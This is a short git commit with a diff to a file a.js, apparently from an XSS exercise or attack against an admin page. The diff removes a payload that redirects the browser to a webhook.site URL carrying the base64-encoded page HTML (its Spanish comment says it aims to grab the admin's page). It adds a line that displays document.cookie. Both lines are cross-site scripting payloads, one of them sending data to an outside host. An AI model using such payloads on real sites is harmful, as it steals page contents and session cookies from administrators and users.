70761111aace765c7d446cfc9f4d2ebd1d86bbac
No-Blip <mebloquearonlacuenta@gmail.com>
2026-03-28 00:02:36 -0400

    hol

--- a.js
+++ a.js
@@ -1,2 +1,1 @@
-// Intentamos sacar el HTML de la página del admin
-document.location = "https://webhook.site/99aac403-e94c-483f-a34d-7688b8053be3?c=" + btoa(document.body.innerHTML);
+alert(document.cookie);
